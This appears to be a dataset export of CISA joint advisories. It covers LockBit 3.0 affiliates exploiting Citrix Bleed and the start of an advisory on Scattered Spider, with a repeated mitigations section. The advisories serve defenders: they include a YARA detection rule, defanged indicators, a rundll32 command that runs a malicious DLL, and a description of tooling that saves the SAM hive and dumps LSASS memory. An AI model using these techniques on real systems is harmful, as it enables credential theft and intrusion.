Import ""pe"" rule M_Hunting_Backdoor_FREEFIRE {meta: author = ""Mandiant"" description = ""This is a hunting rule to detect FREEFIRE samples using OP code sequences in getLastRecord method"" md5 = ""eb842a9509dece779d138d2e6b0f6949"" malware_family = ""FREEFIRE"" strings: $s1 = { 72 ?? ?? ?? ?? 7E ?? ?? ?? ?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 74 ?? ?? ?? ?? 25 72 ?? ?? ?? ?? 6F ?? ?? ?? ?? 25 72 ?? ?? ?? ?? 6F ?? ?? ?? ?? 25 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? 72 ?? ?? ?? ?? 7E ?? ?? ?? ?? 28 ?? ?? ?? ?? 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 74 ?? ?? ?? ?? 25 6F ?? ?? ?? ?? 73 ?? ?? ?? ?? 6F ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? 7E ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? ?? } condition: uint16(0) == 0x5A4D and filesize >= 5KB and pe.imports(""mscoree.dll"") and all of them }



INCIDENT RESPONSE
Organizations are encouraged to assess Citrix software and your systems for evidence of compromise, and to hunt for malicious activity (see Additional Resources section).If compromise is suspected or detected, organizations should assume that threat actors hold full administrative access and can perform all tasks associated with the web management software as well as installing malicious code.
If a potential compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Create new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.

Note: Removing malicious administrator accounts may not fully mitigate risk considering threat actors may have established additional persistence mechanisms.


Report the compromise to FBI Internet Crime Complaint Center (IC3) at IC3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government (SLTT) entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722). If outside of the US, please contact your national cyber center.

MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders using Citrix NetScaler ADC and Gateway software. CISA and authoring organizations recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of exploitation such as threat actors leveraging unpatched vulnerabilities within Citrix NetScaler appliances, which strengthens the security posture of their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The authoring organizations of this CSA recommend organizations implement the mitigations below to improve your cybersecurity posture on the basis of the threat actor activity and to reduce the risk of compromise associated with Citrix CVE 2023-4966 and LockBit 3.0 ransomware & ransomware affiliates. These mitigations align with the Cross-Sector Cybersecurity performance goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Isolate NetScaler ADC and Gateway appliances for testing until patching is ready and deployable.
Secure remote access tools by:

Implement application controls to manage and control the execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Restrict the use of PowerShell, using Group Policy, and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG 2.E].
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].
Enable enhanced PowerShell logging [CPG 2.T, 2.U].

PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.""
Require administrator credentials to install software.


Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].

Upgrade vulnerable NetScaler ADC and Gateway appliances to the latest version available to lower the risk of compromise.



VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 1).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and the authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
The Joint Ransomware Guide provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.
Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost cyber hygiene and ransomware readiness assessment services.
For more resources to help aid in the mitigation of cyber threats and ransomware attacks visit Strategies to Mitigate Cyber Security Incidents, Protect yourself from Ransomware, and How the ASD’s ACSC can help during a Cyber Security Incident.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with LockBit 3.0 affiliates, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD’s ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the authoring organizations.
ACKNOWLEDGEMENTS
Boeing contributed to this CSA.
REFERENCES
[1] NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966[2] What is Mshta, How Can it Be Used and How to Protect Against it (McAfee)[3] Investigation of Session Hijacking via Citrix NetScaler ADC and Gateway Vulnerability (CVE-2023-4966)
VERSION HISTORY
November 21, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1539', 'T1563', 'T1082', 'T1556.006'}","



SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), Multi-State Information Sharing & Analysis Center (MS-ISAC), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) are releasing this joint Cybersecurity Advisory (CSA) to disseminate IOCs, TTPs, and detection methods associated with LockBit 3.0 ransomware exploiting CVE-2023-4966, labeled Citrix Bleed, affecting Citrix NetScaler web application delivery control (ADC) and NetScaler Gateway appliances.
This CSA provides TTPs and IOCs obtained from FBI, ACSC, and voluntarily shared by Boeing. Boeing observed LockBit 3.0 affiliates exploiting CVE-2023-4966, to obtain initial access to Boeing Distribution Inc., its parts and distribution business that maintains a separate environment. Other trusted third parties have observed similar activity impacting their organization.
Historically, LockBit 3.0 affiliates have conducted attacks against organizations of varying sizes across multiple critical infrastructure sectors, including education, energy, financial services, food and agriculture, government and emergency services, healthcare, manufacturing, and transportation. Observed TTPs for LockBit ransomware attacks can vary significantly in observed TTPs.
Citrix Bleed, known to be leveraged by LockBit 3.0 affiliates, allows threat actors to bypass password requirements and multifactor authentication (MFA), leading to successful session hijacking of legitimate user sessions on Citrix NetScaler web application delivery control (ADC) and Gateway appliances. Through the takeover of legitimate user sessions, malicious actors acquire elevated permissions to harvest credentials, move laterally, and access data and resources.
CISA and the authoring organizations strongly encourage network administrators to apply the mitigations found in this CSA, which include isolating NetScaler ADC and Gateway appliances and applying necessary software updates through the Citrix Knowledge Center.
The authoring organizations encourage network defenders to hunt for malicious activity on their networks using the detection methods and IOCs within this CSA. If a potential compromise is detected, organizations should apply the incident response recommendations. If no compromise is detected, organizations should immediately apply patches made publicly available.
For the associated Malware Analysis Report (MAR), see: MAR-10478915-1.v1 Citrix Bleed
Download the PDF version of this report:


AA23-325A LockBit 3.0 Ransomware Affiliates Exploit CVE 2023-4966 Citrix Bleed Vulnerability
(PDF,       631.83 KB
  )


For a downloadable copy of IOCs, see:


AA23-325A STIX XML
(XML,       29.22 KB
  )




AA23-325A STIX JSON
(JSON,       23.00 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
CVE-2023-4966
CVE-2023-4966 is a software vulnerability found in Citrix NetScaler ADC and NetScaler Gateway appliances with exploitation activity identified as early as August 2023. This vulnerability provides threat actors, including LockBit 3.0 ransomware affiliates, the capability to bypass MFA, and hijack legitimate user sessions,.
After acquiring access to valid cookies, LockBit 3.0 affiliates establish an authenticated session within the NetScaler appliance without a username, password, or access to MFA tokens,. Affiliates acquire this by sending an HTTP GET request with a crafted HTTP Host header, leading to a vulnerable appliance returning system memory information,. The information obtained through this exploit contains a valid NetScaler AAA session cookie.
Citrix publicly disclosed CVE-2023-4966 on Oct. 10, 2023, within their Citrix Security Bulletin, which issued guidance, and detailed the affected products, IOCs, and recommendations. Based on widely available public exploits and evidence of active exploitation, CISA added this vulnerability to the Known Exploited Vulnerabilities (KEVs) Catalog. This critical vulnerability exploit impacts the following software versions,1,:

NetScaler ADC and NetScaler Gateway 14.1 before 14.1-8.50
NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.15
NetScaler ADC and NetScaler Gateway 13.0 before 13.0-92.19
NetScaler ADC and NetScaler Gateway version 12.1 (EOL)
NetScaler ADC 13.1FIPS before 13.1-37.163
NetScaler ADC 12.1-FIPS before 12.1-55.300
NetScaler ADC 12.1-NDcPP before 12.1-55.300

Due to the ease of exploitation, CISA and the authoring organizations expect to see widespread exploitation of the Citrix vulnerability in unpatched software services throughout both private and public networks.
Threat Actor Activity
Malware identified in this campaign is generated beginning with the execution of a PowerShell script (123.ps1) which concatenates two base64 strings together, converts them to bytes, and writes them to the designated file path.

The resulting file (adobelib.dll) is then executed by the PowerShell script using rundll32.
rundll32 C:\Users\Public\adobelib.dll,main <104 hex char key>
The Dynamic Link Library (DLL) will not execute correctly without the 104 hex character key. Following execution, the DLL attempts to send a POST request to https://adobe-us-updatefiles,.,digital/index.php which resolves to IP addresses 172.67.129,.,176 and 104.21.1,.,180 as of November 16, 2023. Although adobelib.dll and the adobe-us-updatefiles,.,digital have the appearance of legitimacy, the file and domain have no association with legitimate Adobe software and no identified interaction with the software.
Other observed activities include the use of a variety of TTPs commonly associated with ransomware activity. For example, LockBit 3.0 affiliates have been observed using AnyDesk and Splashtop remote management and monitoring (RMM), Batch and PowerShell scripts, the execution of HTA files using the Windows native utility mshta.exe and other common software tools typically associated with ransomware incidents.
INDICATORS OF COMPROMISE (IOCS)
See Table 1–Table 5 for IOCs related to Lockbit 3.0 affiliate exploitation of CVE-2023-4966.,Fidelity, Legend:

High = Indicator is unique or highly indicates LockBit in an environment.
Medium = Indicator was used by LockBit but is used outside of LockBit activity, albeit rarely.
Low = Indicates tools that are commonly used but were used by LockBit.

Low confidence indicators may not be related to ransomware.
Disclaimer: Some IP addresses in this CSA may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.



The authoring organizations recommended monitoring/reviewing traffic to the 81.19.135,.,* class C network and review for MSHTA being called with HTTP arguments,2,.


MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 6 and Table 7 for all referenced threat actor tactics and techniques in this advisory.


DETECTION METHODS
Hunting Guidance
Network defenders should prioritize observing users in session when hunting for network anomalies. This will aid the hunt for suspicious activity such as installing tools on the system (e.g., putty, rClone ), new account creation, log item failure, or running commands such as hostname, quser, whoami, net, and taskkill. Rotating credentials for identities provisioned for accessing resources via a vulnerable NetScaler ADC or Gateway appliance can also aid in detection.
For IP addresses:

Identify if NetScaler logs the change in IP.
Identify if users are logging in from geolocations uncommon for your organization’s user base.
If logging VPN authentication, identify if users are associated with two or more public IP addresses while in a different subnet or geographically dispersed.

Note: MFA to NetScaler will not operate as intended due to the attacker bypassing authentication by providing a token/session for an already authenticated user.
The following procedures can help identify potential exploitation of CVE-2023-4966 and LockBit 3.0 activity:

Search for filenames that contain tf0gYx2YI for identifying LockBit encrypted files.
LockBit 3.0 actors were seen using the C:\Temp directory for loading and the execution of files.
Investigate requests to the HTTP/S endpoint from WAF.
Hunt for suspicious login patterns from NetScaler logs
Hunt for suspicious virtual desktop agent Windows Registry keys
Analyze memory core dump files.

Below, are CISA developed YARA rules and an open-source rule that may be used to detect malicious activity in the Citrix NetScaler ADC and Gateway software environment. For more information on detecting suspicious activity within NetScaler logs or additional resources, visit CISA’s Malware Analysis Report (MAR) MAR-10478915-1.v1 Citrix Bleed or the resource section of this CSA,3,:
YARA Rules
CISA received four files for analysis that show files being used to save registry hives, dump the Local Security Authority Subsystem Service (LSASS) process memory to disk, and attempt to establish sessions via Windows Remote Management (WinRM). The files include:

Windows Batch file (.bat)
Windows Executable (.exe)
Windows Dynamic Link Library (.dll)
Python Script (.py)


This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0,.,1 three times.
The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory. Again, a.bat pings the loop back address 127.0.0,.,1 one time before executing another reg save command and saves the HKLM\SAM registry hive into the C:\Windows\Task\am directory. Next, a.bat runs three makecab commands to create three cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\Users\Public\a.png. The names of the .cab files are as follows:

c:\windows\tasks\em.cab
c:\windows\tasks\am.cab
c:\windows\tasks\a.cab


This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the remote procedure call (RPC) ncalrpc:,lsasspirpc, to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message "",*,success"" in the console.

This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\Users\Public.
Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\Windows\Tasks.

This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword ""hashpasswd"" is present. If the keyword ""hashpasswd"" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.
Open Source YARA Rule

INCIDENT RESPONSE
Organizations are encouraged to assess Citrix software and your systems for evidence of compromise, and to hunt for malicious activity (see Additional Resources section).If compromise is suspected or detected, organizations should assume that threat actors hold full administrative access and can perform all tasks associated with the web management software as well as installing malicious code.
If a potential compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Create new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.

Note: Removing malicious administrator accounts may not fully mitigate risk considering threat actors may have established additional persistence mechanisms.


Report the compromise to FBI Internet Crime Complaint Center (IC3) at IC3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government (SLTT) entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722). If outside of the US, please contact your national cyber center.

MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders using Citrix NetScaler ADC and Gateway software. CISA and authoring organizations recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of exploitation such as threat actors leveraging unpatched vulnerabilities within Citrix NetScaler appliances, which strengthens the security posture of their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The authoring organizations of this CSA recommend organizations implement the mitigations below to improve your cybersecurity posture on the basis of the threat actor activity and to reduce the risk of compromise associated with Citrix CVE 2023-4966 and LockBit 3.0 ransomware & ransomware affiliates. These mitigations align with the Cross-Sector Cybersecurity performance goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Isolate NetScaler ADC and Gateway appliances for testing until patching is ready and deployable.
Secure remote access tools by:

Implement application controls to manage and control the execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Restrict the use of PowerShell, using Group Policy, and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell,CPG 2.E,.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities,CPG 1.E, 2.S, 2.T,.
Enable enhanced PowerShell logging,CPG 2.T, 2.U,.

PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.""
Require administrator credentials to install software.


Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.

Upgrade vulnerable NetScaler ADC and Gateway appliances to the latest version available to lower the risk of compromise.



VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 1).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and the authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
The Joint Ransomware Guide provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.
Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost cyber hygiene and ransomware readiness assessment services.
For more resources to help aid in the mitigation of cyber threats and ransomware attacks visit Strategies to Mitigate Cyber Security Incidents, Protect yourself from Ransomware, and How the ASD’s ACSC can help during a Cyber Security Incident.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with LockBit 3.0 affiliates, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD’s ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the authoring organizations.
ACKNOWLEDGEMENTS
Boeing contributed to this CSA.
REFERENCES,1, NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966,2, What is Mshta, How Can it Be Used and How to Protect Against it (McAfee),3, Investigation of Session Hijacking via Citrix NetScaler ADC and Gateway Vulnerability (CVE-2023-4966)
VERSION HISTORY
November 21, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a
13,"



SUMMARY
The Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) in response to recent activity by Scattered Spider threat actors against the commercial facilities sectors and subsectors. This advisory provides tactics, techniques, and procedures (TTPs) obtained through FBI investigations as recently as November 2023.
Scattered Spider is a cybercriminal group that targets large companies and their contracted information technology (IT) help desks. Scattered Spider threat actors, per trusted third parties, have typically engaged in data theft for extortion and have also been known to utilize BlackCat/ALPHV ransomware alongside their usual TTPs.
The FBI and CISA encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of a cyberattack by Scattered Spider actors.
Download the PDF version of this report:


AA23-320A Scattered Spider
(PDF,       510.78 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK® Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
Scattered Spider (also known as Starfraud, UNC3944, Scatter Swine, and Muddled Libra) engages in data extortion and several other criminal activities.[1] Scattered Spider threat actors are considered experts in social engineering and use multiple social engineering techniques, especially phishing, push bombing, and subscriber identity module (SIM) swap attacks, to obtain credentials, install remote access tools, and/or bypass multi-factor authentication (MFA). According to public reporting, Scattered Spider threat actors have [2],[3],[4]:

Posed as company IT and/or helpdesk staff using phone calls or SMS messages to obtain credentials from employees and gain access to the network [T1598],[T1656].
Posed as company IT and/or helpdesk staff to direct employees to run commercial remote access tools enabling initial access [T1204],[T1219],[T1566].
Posed as IT staff to convince employees to share their one-time password (OTP), an MFA authentication code.
Sent repeated MFA notification prompts leading to employees pressing the “Accept” button (also known as MFA fatigue) [T1621].[5]
Convinced cellular carriers to transfer control of a targeted user’s phone number to a SIM card they controlled, gaining control over the phone and access to MFA prompts.
Monetized access to victim networks in numerous ways including extortion enabled by ransomware and data theft [T1657].

After gaining access to networks, the FBI observed Scattered Spider threat actors using publicly available, legitimate remote access tunneling tools. Table 1 details a list of legitimate tools Scattered Spider, repurposed and used for their criminal activity. Note: The use of these legitimate tools alone is not indicative of criminal activity. Users should review the Scattered Spider indicators of compromise (IOCs) and TTPs discussed in this CSA to determine whether they have been compromised.

Table 1: Legitimate Tools Used by Scattered Spider


Tool
Intended Use




Fleetdeck.io
Enables remote monitoring and management of systems.


Level.io
Enables remote monitoring and management of systems.


Mimikatz [S0002]
Extracts credentials from a system.


Ngrok [S0508]
Enables remote access to a local web server by tunneling over the internet.


Pulseway
Enables remote monitoring and management of systems.


Screenconnect
Enables remote connections to network devices for management.


Splashtop
Enables remote connections to network devices for management.


Tactical.RMM
Enables remote monitoring and management of systems.


Tailscale
Provides virtual private networks (VPNs) to secure network communications.


Teamviewer
Enables remote connections to network devices for management.



In addition to using legitimate tools, Scattered Spider also uses malware as part of its TTPs. See Table 2 for some of the malware used by Scattered Spider.

Table 2: Malware Used by Scattered Spider


Malware
Use




AveMaria (also known as WarZone [S0670])
Enables remote access to a victim’s systems.


Raccoon Stealer
Steals information including login credentials [TA0006], browser history [T1217], cookies [T1539], and other data.


VIDAR Stealer
Steals information including login credentials, browser history, cookies, and other data.



Scattered Spider threat actors have historically evaded detection on target networks by using living off the land techniques and allowlisted applications to navigate victim networks, as well as frequently modifying their TTPs.
Observably, Scattered Spider threat actors have exfiltrated data [TA0010] after gaining access and threatened to release it without deploying ransomware; this includes exfiltration to multiple sites including U.S.-based data centers and MEGA[.]NZ [T1567.002].
Recent Scattered Spider TTPs
New TTP - File Encryption
More recently, the FBI has identified Scattered Spider threat actors now encrypting victim files after exfiltration [T1486]. After exfiltrating and/or encrypting data, Scattered Spider threat actors communicate with victims via TOR, Tox, email, or encrypted applications.
Reconnaissance, Resource Development, and Initial Access
Scattered Spider intrusions often begin with broad phishing [T1566] and smishing [T1660] attempts against a target using victim-specific crafted domains, such as the domains listed in Table 3 [T1583.001].

Table 3: Domains Used by Scattered Spider Threat Actors


Domains




victimname-sso[.]com


victimname-servicedesk[.]com


victimname-okta[.]com



In most instances, Scattered Spider threat actors conduct SIM swapping attacks against users that respond to the phishing/smishing attempt. The threat actors then work to identify the personally identifiable information (PII) of the most valuable users that succumbed to the phishing/smishing, obtaining answers for those users’ security questions. After identifying usernames, passwords, PII [T1589], and conducting SIM swaps, the threat actors then use social engineering techniques [T1656] to convince IT help desk personnel to reset passwords and/or MFA tokens [T1078.002],[T1199],[T1566.004] to perform account takeovers against the users in single sign-on (SSO) environments.
Execution, Persistence, and Privilege Escalation
